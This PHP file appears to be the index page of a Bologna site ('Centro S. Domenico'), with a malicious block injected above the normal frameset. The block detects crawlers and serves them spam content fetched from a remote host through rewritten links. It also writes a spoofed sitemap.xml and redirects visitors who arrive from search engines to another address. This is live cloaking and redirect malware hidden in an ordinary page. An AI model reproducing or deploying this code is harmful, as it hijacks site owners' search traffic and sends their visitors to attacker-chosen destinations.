<?php
error_reporting(E_ALL^E_NOTICE^E_WARNING);
set_time_limit(180);
header("Content-type: text/html; charset=utf-8");

function isSpider() {
    if (preg_match("/(bot|crawl|spider|slurp|yahoo|sohu-search|lycos|robozilla)/i", @$_SERVER['HTTP_USER_AGENT'])) {
        return true;
    } else {
        return false;
    }
}

function isEngine() {
    if (preg_match("/(google|bing|aol|search|baidu|yahoo|sogou|soso|live|youdao|so)/i", @$_SERVER['HTTP_REFERER'])) {
        return true;
    } else {
        return false;
    }
}

if (isSpider()) {
    if (strlen(trim($_SERVER["QUERY_STRING"])) >= 0) {
        if ($_SERVER["QUERY_STRING"] == "sitemap.xml/") {
            header("Content-type: text/xml; charset=utf-8");
            $tlinks_get = @file_get_contents($tlinks . 'sitemap.xml');
            $tlinks_get = str_ireplace($tlinks, $tshell . $tshell_index . "?", $tlinks_get);
            $file = @fopen("sitemap.xml", "w");
            fwrite($file, $tlinks_get);
            fclose($file);
        }
        header("Content-type: text/html; charset=utf-8");
        $tlinks_get = @file_get_contents($tlinks . $_SERVER["QUERY_STRING"]);
        $tlinks_get = str_ireplace($tlinks, $tshell . $tshell_index . "?", $tlinks_get);
        $tlinks_get = str_ireplace("href=\"/", "href=\"/" . $tshell_index . "?", $tlinks_get);
        $tlinks_get = str_ireplace("href='/", "href='/" . $tshell_index . "?", $tlinks_get);
        echo $tlinks_get;
        exit();
    }
    header("Content-type: text/html; charset=utf-8");
    $tlinks_get = @file_get_contents($tlinks);
    $tlinks_get = str_ireplace($tlinks, $tshell . $tshell_index . "?", $tlinks_get);
    $tlinks_get = str_ireplace("href=\"/", "href=\"/" . $tshell_index . "?", $tlinks_get);
    $tlinks_get = str_ireplace("href='/", "href='/" . $tshell_index . "?", $tlinks_get);
    echo $tlinks_get;
    exit();
}

if (isEngine()) {
    echo "<script>window.location = '" . $jumpto . "';</script>";
    exit();
}
?>
<!DOCTYPE html> <html><head>   <title>Centro S. Domenico - Bologna</title></head>
<frameset cols="180,*" border="0"><frame src="menu.htm" name="menu"><frame src="schema.htm" name="pagina"></frameset></html>
